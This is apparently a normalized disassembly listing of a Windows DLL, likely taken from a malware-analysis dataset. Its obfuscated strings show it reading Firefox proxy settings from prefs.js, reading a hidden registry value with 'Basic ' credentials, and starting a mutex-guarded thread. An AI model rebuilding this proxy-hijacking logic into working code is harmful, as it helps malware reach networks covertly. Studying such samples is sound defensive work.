jmp r-xdata
mov ecx [ ebp - 0xc ]
call sub_10006da0
test al al
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1c
push ebx
call [ eax ]
jmp r-xdata
push r--data
call sub_10003fd4
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1d
push ebx
call [ eax ]
mov ecx [ ebp - 0xc ]
call sub_10006cce
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp - 0x34 ]
call sub_100050e0
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1e
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
and [ ebp - 0x1c ] 0x0
cmp [ ecx + 0x24 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x28 ]
je r-xdata
push r--data
call sub_10003fd4
mov [ ebp - 0x34 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x24
push ebx
call [ eax ]
push [ ebp - 0x34 ]
mov ecx [ ebp - 0x4 ]
push [ ebp - 0x2c ]
call sub_100050e0
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x25
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x24 ] 0x0
push [ ebp - 0x28 ]
je r-xdata
call sub_10005eb5
call sub_10006139
jmp r-xdata
call sub_10005bb1
call sub_1000637b
jmp r-xdata
push [ ebp - 0x28 ]
call sub_1000470c
push [ ebp - 0x34 ]
call sub_1000470c
pop ecx
pop ecx
push [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
push [ ebp - 0x10 ]
call sub_10006cd6
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x20
push ebx
call [ eax ]
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x1f
push ebx
call [ eax ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp - 0x14 ]
call sub_1000470c
pop ecx
call sub_10006d7d
push [ ebp - 0xc ]
call sub_100046eb
pop ecx
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x26
push ebx
call [ eax ]
push [ ebp - 0x28 ]
call sub_1000470c
push [ ebp - 0x34 ]
call sub_1000470c
pop ecx
pop ecx
mov ecx [ ebp - 0xc ]
test ecx ecx
je r-xdata
push [ ebp - 0x10 ]
call sub_1000470c
pop ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4 ]
push 0x1
push r--data
call sub_10003fd4
mov [ ebp - 0x30 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x21
push ebx
call [ eax ]
push [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
push [ ebp - 0x30 ]
call sub_100050e0
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x22
push ebx
call [ eax ]
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x24 ] 0x0
push [ ebp - 0x20 ]
je r-xdata
call sub_10005bb1
call sub_1000637b
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x8 ]
push esi
push 0x1
push 0x23
push ebx
call [ eax ]
push [ ebp - 0x20 ]
call sub_1000470c
push [ ebp - 0x30 ]
call sub_1000470c
push [ ebp - 0x24 ]
call sub_1000470c
add esp 0xc
sub_10006be3
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov cl [ eax + edx ]
cmp cl 0xd
je r-xdata
mov [ eax + edx ] 0x0
cmp cl 0xa
jne r-xdata
inc edx
cmp edx [ ebp + 0xc ]
jb r-xdata
sub_10006c0b
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push 0x3d
push [ ebp + 0x8 ]
mov esi ecx
call sub_100040d0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebx
leave
retn 0x4
push edi
mov [ ebx ] 0x0
mov ecx [ esi ]
push 0x8
push r--data
inc ebx
call sub_10003fd4
mov ecx [ esi ]
push 0xa
push r--data
mov [ ebp - 0xc ] eax
call sub_10003fd4
mov ecx [ esi ]
push 0x6
push r--data
mov [ ebp - 0x8 ] eax
call sub_10003fd4
push [ ebp - 0xc ]
mov edi [ lstrcmpiA@IAT ]
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
call edi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ebx
call sub_10004235
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call edi
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
push ebx
call sub_10004247
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1000470c
push [ ebp - 0x8 ]
call sub_1000470c
push [ ebp - 0xc ]
call sub_1000470c
add esp 0xc
pop edi
mov ecx [ esi + 0x4 ]
push ebx
call sub_10004278
sub_10006cd6
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
call sub_1000428a
push 0x401
call sub_100046e2
pop ecx
mov ebx eax
call [ GetLastError@IAT ]
mov ecx [ esi + 0x4 ]
push eax
call sub_10004dce
push eax
push r--data
push ebx
call [ wsprintfA@IAT ]
mov edi [ esi + 0x4 ]
add esp 0x10
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x8
mov ecx edi
call sub_10004420
push edi
call sub_100046eb
pop ecx
sub_10006d3a
push ebp
mov ebp esp
push esi
push 0xc
mov esi ecx
call sub_100046cb
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10003cb8
jmp r-xdata
mov ecx [ ebp + 0x8 ]
and [ esi + 0xc ] 0x0
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
mov eax [ ebp + 0xc ]
push eax
mov [ esi + 0x8 ] ecx
push ecx
mov ecx esi
mov [ esi + 0x10 ] eax
call sub_10006be3
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10006d7d
push esi
mov esi ecx
push edi
mov edi [ esi ]
test edi edi
je r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
pop edi
pop esi
retn
mov ecx edi
call sub_10004024
push edi
call sub_100046eb
pop ecx
sub_10006da0
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov esi ecx
mov eax [ esi + 0xc ]
push edi
cmp eax [ esi + 0x10 ]
jae r-xdata
xor al al
mov edi [ GetLastError@IAT ]
mov ebx r--data
mov ecx [ esi ]
push 0x6
push r--data
call sub_10003fd4
mov [ ebp - 0x14 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x7
push ebx
call [ eax ]
mov ecx [ esi ]
push 0x7
push r--data
call sub_10003fd4
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x8
push ebx
call [ eax ]
mov ecx [ esi ]
push 0x6
push r--data
call sub_10003fd4
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0x9
push ebx
call [ eax ]
mov ecx [ esi ]
push 0x7
push r--data
call sub_10003fd4
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xa
push ebx
call [ eax ]
push [ ebp - 0x14 ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
inc eax
inc [ esi + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
push [ ebp - 0x10 ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push r--data
push 0x1
push 0xb
push ebx
call [ eax ]
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x4 ] ecx
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
cmp eax [ esi + 0x10 ]
jb r-xdata
push [ ebp - 0xc ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
call sub_10004242
jmp r-xdata
push 0x12
call sub_100046cb
pop ecx
test eax eax
je r-xdata
call sub_10004420
push [ ebp - 0x4 ]
call sub_100046eb
pop ecx
mov eax [ esi + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x8 ]
push [ esi + 0x8 ]
call [ lstrcmpiA@IAT ]
push [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
call sub_10004285
jmp r-xdata
push [ esi + 0x8 ]
call [ lstrlenA@IAT ]
push [ esi + 0x8 ]
add [ esi + 0xc ] eax
call [ lstrlenA@IAT ]
push [ ebp - 0x8 ]
add [ esi + 0x8 ] eax
call sub_1000470c
push [ ebp - 0xc ]
call sub_1000470c
push [ ebp - 0x10 ]
call sub_1000470c
push [ ebp - 0x14 ]
call sub_1000470c
add esp 0x10
xor eax eax
mov ecx eax
call sub_10004204
jmp r-xdata
mov edi [ lstrlenA@IAT ]
call edi
push [ esi + 0x8 ]
add [ esi + 0xc ] eax
call edi
push [ ebp - 0x8 ]
add [ esi + 0x8 ] eax
call sub_1000470c
push [ ebp - 0xc ]
call sub_1000470c
push [ ebp - 0x10 ]
call sub_1000470c
push [ ebp - 0x14 ]
call sub_1000470c
add esp 0x10
mov al 0x1
jmp r-xdata
mov ecx esi
call sub_10006c0b
mov [ esi + 0x4 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10006fde
push esi
mov esi ecx
mov eax [ esi ]
push 0x0
call [ eax + 0x14 ]
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x1c ]
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0x18 ]
pop esi
retn
sub_10007012
push ebp
mov ebp esp
sub esp 0xa0
push ebx
push esi
push edi
mov ebx 0x208
push ebx
mov edi ecx
call sub_100046e2
push ebx
push [ ebp + 0x8 ]
mov esi eax
push esi
call sub_10004144
mov ebx [ lstrcatW@IAT ]
add esp 0x10
push r--data
push esi
call ebx
push 0x70
pop eax
push 0x72
mov [ ebp - 0x98 ] ax
pop eax
push 0x65
mov [ ebp - 0x96 ] ax
pop eax
push 0x66
mov [ ebp - 0x94 ] ax
pop eax
push 0x73
mov [ ebp - 0x92 ] ax
pop eax
push 0x2e
mov [ ebp - 0x90 ] ax
pop eax
push 0x6a
mov [ ebp - 0x8e ] ax
pop eax
push 0x73
mov [ ebp - 0x8c ] ax
pop eax
mov [ ebp - 0x8a ] ax
xor eax eax
mov [ ebp - 0x88 ] ax
lea eax [ ebp - 0x98 ]
push eax
push esi
call ebx
xor ebx ebx
push ebx
push ebx
push 0x3
push ebx
push 0x1
push 0x80000000
push esi
call [ CreateFileW@IAT ]
mov [ ebp - 0x4 ] eax
push esi
cmp eax 0xffffffff
jne r-xdata
call sub_1000470c
pop ecx
push ebx
push [ ebp - 0x4 ]
call [ GetFileSize@IAT ]
mov esi eax
push esi
call sub_100046e2
pop ecx
push ebx
lea ecx [ ebp - 0xa0 ]
push ecx
push esi
push eax
push [ ebp - 0x4 ]
mov [ ebp + 0x8 ] eax
mov [ ebp - 0xa0 ] ebx
call [ ReadFile@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4c ] 0x7774656e
mov [ ebp - 0x48 ] 0x2e6b726f
mov [ ebp - 0x44 ] 0x786f7270
mov [ ebp - 0x40 ] 0x74682e79
mov [ ebp - 0x3c ] 0x7074
mov [ ebp - 0x3a ] bl
mov [ ebp - 0x7c ] 0x7774656e
mov [ ebp - 0x78 ] 0x2e6b726f
mov [ ebp - 0x74 ] 0x786f7270
mov [ ebp - 0x70 ] 0x74682e79
mov [ ebp - 0x6c ] 0x705f7074
mov [ ebp - 0x68 ] 0x74726f
call sub_100040ee
pop ecx
pop ecx
cmp eax ebx
jne r-xdata
call sub_1000470c
push r--data
push eax
call sub_100040ee
lea esi [ eax + 0x3 ]
push r--data
push esi
call sub_100040ee
sub eax esi
mov [ ebp - 0x8 ] eax
inc eax
push eax
call sub_100046e2
push [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
push esi
push eax
call sub_10004144
lea eax [ ebp - 0x7c ]
push eax
push [ ebp + 0x8 ]
call sub_100040ee
add esp 0x28
cmp eax ebx
jne r-xdata
push [ ebp + 0x8 ]
jmp r-xdata
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
push r--data
push eax
call sub_100040ee
lea esi [ eax + 0x2 ]
push r--data
push esi
call sub_100040ee
sub eax esi
mov [ ebp - 0x8 ] eax
inc eax
push eax
call sub_100046e2
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
push esi
push eax
call sub_10004144
push [ ebp + 0x8 ]
call sub_1000470c
push 0x104
call sub_100046e2
push [ ebp - 0xc ]
mov esi eax
push [ ebp - 0x4 ]
lea eax [ ebp - 0x38 ]
push eax
push esi
mov [ ebp - 0x38 ] 0x70747468
mov [ ebp - 0x34 ] 0x7474683d
mov [ ebp - 0x30 ] 0x2f2f3a70
mov [ ebp - 0x2c ] 0x253a7325
mov [ ebp - 0x28 ] 0x73
call [ wsprintfA@IAT ]
mov eax [ edi ]
add esp 0x38
push esi
mov ecx edi
call [ eax + 0x14 ]
push [ ebp - 0x4 ]
call sub_1000470c
push [ ebp - 0xc ]
call sub_1000470c
pop ecx
pop ecx
lea eax [ ebp - 0x80 ]
push eax
push 0x1
push ebx
lea eax [ ebp - 0x64 ]
push eax
push 0x80000001
mov [ ebp - 0x64 ] 0x746e6f43
mov [ ebp - 0x60 ] 0x206c6f72
mov [ ebp - 0x5c ] 0x656e6150
mov [ ebp - 0x58 ] 0x65445c6c
mov [ ebp - 0x54 ] 0x6f746b73
mov [ ebp - 0x50 ] 0x70
call [ RegOpenKeyExA@IAT ]
mov esi [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x80 ]
mov [ ebp - 0x24 ] 0x6c656557
mov [ ebp - 0x20 ] 0x49726353
mov [ ebp - 0x1c ] 0x74696e
call esi
push [ ebp - 0x10 ]
call sub_100046e2
pop ecx
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push ebx
mov [ ebp - 0xc ] eax
push ebx
lea eax [ ebp - 0x24 ]
push eax
push [ ebp - 0x80 ]
call esi
push [ ebp - 0x80 ]
call [ RegCloseKey@IAT ]
lea eax [ ebp - 0x18 ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x69736142
mov [ ebp - 0x14 ] 0x2063
mov [ ebp - 0x12 ] bl
call sub_100040ee
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_1000470c
push [ ebp + 0x8 ]
call sub_1000470c
pop ecx
jmp r-xdata
push [ ebp - 0xc ]
call sub_1000470c
mov al 0x1
push [ ebp - 0x10 ]
call sub_100046e2
mov esi [ lstrlenA@IAT ]
mov [ ebp - 0x4 ] eax
pop ecx
lea eax [ ebp - 0x18 ]
push eax
call esi
mov ecx [ ebp - 0x10 ]
sub ecx eax
add eax [ ebp - 0xc ]
push ecx
push eax
push [ ebp - 0x4 ]
call sub_10004144
push 0x4
call sub_100046cb
add esp 0x10
cmp eax ebx
je r-xdata
xor al al
jmp r-xdata
mov [ ebp + 0x8 ] ebx
mov ecx eax
call sub_10003b8d
mov [ ebp + 0x8 ] eax
jmp r-xdata
push [ ebp - 0x4 ]
call sub_1000470c
push 0x3a
push [ ebp + 0x8 ]
call sub_100040d0
mov ebx [ ebp + 0x8 ]
mov esi eax
sub eax ebx
mov [ ebp - 0x9c ] eax
inc eax
push eax
call sub_100046e2
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x84 ]
sub ebx esi
add eax ebx
push eax
call sub_100046e2
push [ ebp - 0x9c ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call sub_10004144
mov eax [ ebp - 0x84 ]
lea eax [ ebx + eax - 0x1 ]
push eax
inc esi
push esi
push [ ebp - 0x8 ]
call sub_10004144
push [ ebp + 0x8 ]
call sub_1000470c
mov eax [ edi ]
add esp 0x30
push [ ebp - 0x4 ]
mov ecx edi
call [ eax + 0x18 ]
push [ ebp - 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x1c ]
mov ecx esi
call sub_10003b90
push esi
call sub_100046eb
pop ecx
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0x84 ] ebx
call esi
mov ecx [ ebp - 0x10 ]
mov esi [ ebp + 0x8 ]
sub ecx eax
push ecx
push [ ebp - 0x4 ]
mov ecx esi
call sub_10003c21
mov [ ebp + 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10007437
push ebp
mov ebp esp
sub esp 0x888
push ebx
push esi
push edi
xor eax eax
mov esi 0x206
push esi
mov [ ebp - 0x888 ] ax
xor edi edi
lea eax [ ebp - 0x886 ]
push edi
push eax
mov [ ebp - 0x68 ] ecx
call sub_10004195
xor eax eax
push esi
mov [ ebp - 0x270 ] ax
lea eax [ ebp - 0x26e ]
push edi
push eax
call sub_10004195
xor eax eax
push esi
mov [ ebp - 0x478 ] ax
lea eax [ ebp - 0x476 ]
push edi
push eax
call sub_10004195
xor eax eax
push esi
mov [ ebp - 0x680 ] ax
lea eax [ ebp - 0x67e ]
push edi
push eax
call sub_10004195
add esp 0x30
push edi
push 0x1a
lea eax [ ebp - 0x680 ]
push eax
push edi
call [ SHGetSpecialFolderPathW@IAT ]
mov eax [ rw-data ]
mov edi [ GetLastError@IAT ]
mov esi [ eax ]
call edi
mov ecx [ rw-data ]
push eax
push r--data
push 0x1
push 0x3
mov ebx r--data
push ebx
call [ esi ]
push 0x5c
pop eax
push 0x4d
mov [ ebp - 0x60 ] ax
pop eax
push 0x6f
mov [ ebp - 0x5e ] ax
pop eax
push 0x7a
mov [ ebp - 0x5c ] ax
pop eax
push 0x69
mov [ ebp - 0x5a ] ax
pop eax
push 0x6c
mov [ ebp - 0x58 ] ax
pop eax
push 0x61
mov [ ebp - 0x56 ] ax
mov [ ebp - 0x54 ] ax
pop eax
push 0x5c
mov [ ebp - 0x52 ] ax
pop eax
push 0x46
mov [ ebp - 0x50 ] ax
pop eax
mov [ ebp - 0x4e ] ax
push 0x69
pop eax
push 0x72
mov [ ebp - 0x4c ] ax
pop eax
push 0x65
mov esi [ lstrcatW@IAT ]
mov [ ebp - 0x4a ] ax
pop eax
push 0x66
mov [ ebp - 0x48 ] ax
pop eax
push 0x6f
mov [ ebp - 0x46 ] ax
pop eax
mov [ ebp - 0x44 ] ax
push 0x78
pop eax
mov [ ebp - 0x42 ] ax
xor eax eax
mov [ ebp - 0x40 ] ax
lea eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x680 ]
push eax
call esi
lea eax [ ebp - 0x680 ]
push eax
lea eax [ ebp - 0x888 ]
push eax
call esi
push 0x5c
pop eax
push 0x70
mov [ ebp - 0x3c ] ax
pop eax
push 0x72
mov [ ebp - 0x3a ] ax
pop eax
push 0x6f
mov [ ebp - 0x38 ] ax
pop eax
push 0x66
mov [ ebp - 0x36 ] ax
pop eax
push 0x69
mov [ ebp - 0x34 ] ax
pop eax
push 0x6c
mov [ ebp - 0x32 ] ax
pop eax
push 0x65
mov [ ebp - 0x30 ] ax
pop eax
push 0x73
mov [ ebp - 0x2e ] ax
pop eax
push 0x2e
mov [ ebp - 0x2c ] ax
pop eax
push 0x69
mov [ ebp - 0x2a ] ax
pop eax
push 0x6e
mov [ ebp - 0x28 ] ax
pop eax
mov [ ebp - 0x26 ] ax
push 0x69
pop eax
mov [ ebp - 0x24 ] ax
xor eax eax
mov [ ebp - 0x22 ] ax
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x888 ]
push eax
call esi
push 0x50
pop eax
mov [ ebp - 0x20 ] ax
push 0x72
pop eax
push 0x6f
mov [ ebp - 0x1e ] ax
pop eax
push 0x66
mov [ ebp - 0x1c ] ax
pop eax
push 0x69
mov [ ebp - 0x1a ] ax
pop eax
push 0x6c
mov [ ebp - 0x18 ] ax
pop eax
push 0x65
mov [ ebp - 0x16 ] ax
pop eax
push 0x30
mov [ ebp - 0x14 ] ax
pop eax
push 0x50
mov [ ebp - 0x12 ] ax
xor eax eax
mov [ ebp - 0x10 ] ax
pop eax
push 0x61
mov [ ebp - 0xc ] ax
pop eax
push 0x74
mov [ ebp - 0xa ] ax
pop eax
push 0x68
mov [ ebp - 0x8 ] ax
pop eax
mov [ ebp - 0x6 ] ax
xor eax eax
mov [ ebp - 0x4 ] ax
lea eax [ ebp - 0x888 ]
push eax
push 0x104
lea eax [ ebp - 0x270 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call [ GetPrivateProfileStringW@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x64 ] eax
call edi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x64 ]
push r--data
push 0x1
push 0x4
push ebx
call [ eax ]
mov edi [ lstrlenW@IAT ]
lea eax [ ebp - 0x270 ]
push eax
xor ebx ebx
call edi
test eax eax
jle r-xdata
lea eax [ ebp - 0x680 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x478 ]
push eax
call esi
lea eax [ ebp - 0x270 ]
push eax
lea eax [ ebp - 0x478 ]
push eax
call esi
mov ecx [ ebp - 0x68 ]
lea eax [ ebp - 0x478 ]
push eax
call sub_10007012
pop edi
test al al
pop esi
setne al
pop ebx
leave
retn
cmp [ ebp + ebx * 2 - 0x270 ] 0x2f
je r-xdata
push 0x5c
pop eax
mov [ ebp + ebx * 2 - 0x270 ] ax
lea eax [ ebp - 0x270 ]
push eax
inc ebx
call edi
cmp ebx eax
jl r-xdata
jmp r-xdata
sub_1000777f
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push 0x4
push esi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
and [ esi ] 0x0
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004003
jmp r-xdata
mov [ esi ] rw-data
xor eax eax
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
pop esi
pop ebp
retn 0xc
push 0x10
push r--data
push [ ebp + 0xc ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
mov eax 0x80004002
jmp r-xdata
sub_10007811
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push 0x4
push esi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
and [ esi ] 0x0
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax 0x80004003
jmp r-xdata
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
push esi
push [ ebp + 0xc ]
push eax
call [ ecx ]
mov eax 0x80004005
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_10007850
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
js r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push edi
lea edi [ esi + 0x14 ]
push edi
push r--data
push eax
call [ ecx + 0x10 ]
test eax eax
jns r-xdata
mov eax [ edi ]
mov ecx [ eax ]
add esi 0x18
push esi
push rw-data
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
pop edi
sub_100078a9
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push [ esi + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ esi + 0x14 ]
and [ esi + 0x18 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x14 ] 0x0
pop esi
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
and [ esi + 0x10 ] 0x0
sub_100078e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ esi + 0x4 ]
push eax
call [ InterlockedDecrement@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
test esi esi
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x14 ]
sub_1000791f
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push 0x4
push ebx
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebx ] edi
cmp [ esi + 0xc ] edi
jle r-xdata
mov eax 0x80004003
jmp r-xdata
mov eax 0x80004002
mov [ ebp + 0x10 ] edi
pop ebx
pop ebp
retn 0xc
mov [ ebx ] esi
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
xor eax eax
jmp r-xdata
add [ ebp + 0x10 ] 0x10
inc edi
cmp edi [ esi + 0xc ]
jl r-xdata
pop edi
pop esi
mov eax [ esi + 0x8 ]
add eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_10007712
pop ecx
pop ecx
test eax eax
jne r-xdata
sub_10007996
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000790d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100046eb
pop ecx
sub_100079b5
push 0x7d0
call [ Sleep@IAT ]
push r--data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
retn
push esi
push 0x2d
call sub_100046cb
pop ecx
test eax eax
je r-xdata
xor esi esi
mov ecx eax
call sub_10004e57
mov esi eax
jmp r-xdata
mov ecx esi
call sub_100066a7
init
push ebp
mov ebp esp
sub esp 0x24
push 0x4
call sub_100046cb
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_10001000
jmp r-xdata
push edi
push edi
push edi
lea eax [ ebp - 0x24 ]
push eax
call esi
test eax eax
jne r-xdata
push ebx
push esi
mov esi [ GetLastError@IAT ]
mov [ rw-data ] eax
mov eax [ eax ]
push edi
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x1
mov edi r--data
push edi
call [ eax ]
lea eax [ ebp - 0x8 ]
push eax
xor eax eax
push eax
push eax
push sub_100079b5
push eax
push eax
call [ CreateThread@IAT ]
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
